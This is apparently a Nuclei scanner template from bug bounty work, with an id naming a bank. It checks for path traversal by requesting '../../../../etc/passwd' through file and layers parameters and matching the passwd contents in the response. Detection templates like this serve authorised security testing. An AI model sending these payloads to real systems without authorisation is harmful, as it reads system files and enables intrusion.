id: alfabank-path-traversal

info:
  name: Path Traversal - File Parameter
  author: bugbounty
  severity: high
  description: Path traversal via file parameter
  tags: lfi,traversal

http:
  - method: GET
    path:
      - "{{BaseURL}}/showimage.php?file=../../../../etc/passwd&size=160"
      - "{{BaseURL}}/showimage.php?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd&size=160"
      - "{{BaseURL}}/images?layers=../../../../etc/passwd"

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "root:.*:0:0:"
        part: body

      - type: status
        status:
          - 200
